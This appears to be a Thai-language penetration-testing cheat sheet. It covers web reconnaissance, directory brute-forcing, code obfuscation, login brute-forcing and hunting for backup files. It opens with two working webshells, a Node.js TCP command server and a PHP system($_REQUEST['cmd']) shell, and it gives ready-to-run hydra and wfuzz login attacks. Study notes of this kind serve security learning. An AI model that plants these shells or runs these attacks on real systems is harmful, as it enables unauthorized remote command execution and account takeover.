### <span style="color:rgb(255, 162, 31)">Webshell</span>
Nodejs
```plaintext
var net = require('net');
var exec = require('child_process').exec;
var server= net.createServer(function(conn){
    conn.setEncoding('utf8');
    conn.write('\n');
    conn.on('data',function(data){
        data=data.replace('\r\n','');
        exec(data,function(error,stdout){
            if(error !== null){
                conn.write(error + '\n');
                return false;       
            }
            conn.write('########################start\n\n' + stdout + '\n########################end\n\n');
        });
    });
}); 
server.listen(3000,function(){
    console.log('OK');
});
```
PHP
```plaintext
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```
เข้าใช้งานโดย request ได้เป็น
```plaintext
http://<TARGET>/webshell.php?cmd=ls
```

### <span style="color:rgb(255, 162, 31)">Robots.txt</span>
เป็นหน้าที่บอก robots ที่มา scan เว็บว่า หน้าไหน allow หน้าไหน Disallow 
ซึ่งหน้า Disallow เป็นหน้าที่น่าสนใจสำหรับสาย hacker อย่างเรา
```
User-agent: *
Disallow: /admin/
Disallow: /private/
Allow: /public/

Sitemap: https://example.com/sitemap.xml

```
### <span style="color:rgb(255, 162, 31)">Sitemap.xml</span>
```plaintext
http://[[TARGET]]/sitemaps/sitemap.xml
```
หน้าที่ list page ของ website ทั้งมหด
- มุมมองด้านการป้องกัน
  - ป้องกันการเข้า path ที่ไม่เหมาะสม 
  - การประกาศ path ไว้ใน sitemap.xml จะทำให้ bot ไต่ไปตาม link ที่เราต้องการเท่านั้น ซึ่งเราไม่ควรประกาศ path ใดๆ ที่สำคัญภายใน sitemap.xml
- มุมมองด้านการโจมตี
  ทำให้รู้โครงงานสร้างคราวๆของ web ซึ่งเป็นประโยชน์ในการวิเคราะห์ 
ตัวอย่าง sitemap.wml
```plaintext
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
 <url>
 <loc>http://www.example.com/</loc>
 <lastmod>2024-01-01</lastmod>
 <changefreq>daily</changefreq>
 <priority>1.0</priority>
 </url>
 <url>
 <loc>http://www.example.com/about</loc>
 <lastmod>2023-12-15</lastmod>
 <changefreq>monthly</changefreq>
 <priority>0.8</priority>
 </url>
 <url>
 <loc>http://www.example.com/contact</loc>
 <lastmod>2023-12-20</lastmod>
 <changefreq>yearly</changefreq>
 <priority>0.5</priority>
 </url>
 <!-- Additional URLs can be listed in a similar manner -->
</urlset>
```
จากในตัวอย่างนี้
- `<urlset>` คือการประกาศ list ของ url ทั้งหมด
- `<url>` คือ url แต่ละอันที่เราต้องการประกาศ
    - `<loc>` กำหนด URL location.
    - `<lastmod>` กำหนดว่าเวลาแก้ไขล่าสุดของ file.
    - `<changefreq>` กำหนดว่า content ของ URL update บ่อยแค่ไหน
    - `<priority>` กำหนดความสำคัญของ URL โดยมีค่าตั้งแต่ 0.0 - 1.0, โดย 1.0 คือค่าความสำคัญสูงสุด

### <span style="color:rgb(255, 162, 31)">Directory Listing</span>
scan web 
dirb 
```plaintext
dirb <URL>
```
gobuster
```plaintext
gobuster -w <Wordlist> -u <URL> -t <Thread> -x <EXTENSION>
```
Wfuzz (น่าใช้เพราะแม่งเร็วจัด)
```plaintext
wfuzz -c -w <Wordlist> --hc <ERROR CODE> <URL>/FUZZ
```
Dirsearch
```plaintext
dirsearch -u <URL> -e <FILE EXTENSION> -f -x <ERROR CODE>
```
### <span style="color:rgb(255, 162, 31)">Obfuscation/Deobfuscation</span>
<span style="color:rgb(255, 192, 0)">obfuscation</span> คือการทำให้ code มันอ่านยากขึ้น
ประเภท 
- Rename Obfuscation (นิยมมาก)
  คือการเปลี่ยนชื่อตัวแปร
- Data Obfuscation
  คือการเปลี่ยนการเก็บข้อมูล 
  - Aggregation Obfuscation
  - Storage Obfuscation
  - Ordering Obfuscation
  - String Obfuscation
  - Control/Code Flow Obfuscation
- Custom Encoding
เครื่องมือการ Obfuscation
pyhton : https://pypi.org/project/pyarmor/
javascript : 
https://obfuscator.io/
https://javascriptobfuscator.com/Javascript-Obfuscator.aspx
https://www.npmjs.com/package/uglify-js
PHP :
https://github.com/naneau/php-obfuscator
<span style="color:rgb(255, 192, 0)">Deobfuscation</span> คือ การทำให้ code อ่านง่ายขึ้น 
เครื่องมือ Deofuscation
javascript :
https://beautifier.io/
https://prettier.io/
http://www.jsnice.org/

<span style="color:rgb(255, 192, 0)">Debug JavaScript</span>
คือ รัน javascript code นั่นแหละ 
เครื่องมือ
- chorme : inspect > console
- firefox :  เหมือน chorme
- JSConsole.com

### <span style="color:rgb(255, 162, 31)">Brute Force HTTP Login</span>
อุปกรณ์
<span style="color:rgb(255, 192, 0)">Brutesuite</span>
<span style="color:rgb(255, 192, 0)">hydra</span>
```
hydra -l <username> -P <password file> <target> -s <port> http-post-form "<URL>:<username parameter>=^USER^&<password parameter>=^PASS^:F=<False Result>:S=<Success Result>" -v -f -e nsr
```
<span style="color:rgb(255, 192, 0)">Wfuzz</span>
```plaintext
wfuzz -c -z file,/usr/share/seclists/Usernames/Names/names.txt --sc 200 -d "username=FUZZ&password=anything" http://[[TARGET]]/login.php
```
โดยแต่ละ option ความหมายคือ
-z file,`<wordlist>` : กำหนด wordlist ที่ใช้ประกอบการโจมตี.
--sc 200 : แสดง responses เฉพาะที่ response code เป็น 200.
-d "username=FUZZ&password=anything" : ใช้สำหรับ /POST request

### <span style="color:rgb(255, 162, 31)">Backup</span> 
 ตัวอย่างการเข้าใช้ path ที่เป็น backup
```plaintext
http://target.com/database.sql
http://target.com/login.html.backup
http://target.com/login.php.backup
http://target.com/.login.html.swp
http://target.com/login.html.old
```
เครื่องมือตรวจสอบ backup
- Ffuf
- ohmybackup